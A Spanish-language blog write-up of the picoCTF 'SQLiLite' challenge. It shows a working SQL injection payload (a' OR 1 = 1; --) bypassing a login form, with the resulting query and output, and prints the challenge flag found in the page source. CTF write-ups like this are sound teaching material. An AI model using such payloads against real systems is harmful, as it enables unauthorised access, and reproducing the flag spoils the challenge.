---
title: SQLiLite
date: 2025-05-19 00:00:00 +0200
categories: [writeup, picoctf]
tags: [picoctf, sqlite, explotacion web]     
image:
    path: https://picoctf.org/img/logos/pico-mark.svg
    alt: PicoCTF
---

>SQLiLite
Author: Mubarak Mikail
Description
Can you login to this website? Try to login here.
{: .prompt-tip }

Nada más abramos la instancia, y carguemos la página web veremos el típico formulario de login, las pistas dicen que el usuario es 
admin. ¿Probamos con alguna inyección SQL como vimos anteriormente? [picoctf-moresqli](../picoctf-moresqli)

>a' OR 1 = 1; --

```
username: admin
password: a' OR 1 = 1; --
SQL query: SELECT * FROM users WHERE name='admin' AND password='a' OR 1 = 1; --'

Logged in! But can you see the flag, it is in plainsight.
```

Efectivamente funciona pero no podemos ver la flag. Procedo a ver el código fuente de la página a la que hemos accedido y voilá.

``` html
<pre>username: admin
password: a&#039; OR 1 = 1; --
SQL query: SELECT * FROM users WHERE name=&#039;admin&#039; AND password=&#039;a&#039; OR 1 = 1; --&#039;
</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_9b0a4e21}</p>
```

flag: **picoCTF{L00k5_l1k3_y0u_solv3d_it_9b0a4e21}**

De nuevo SQLi, casi una repeteción. 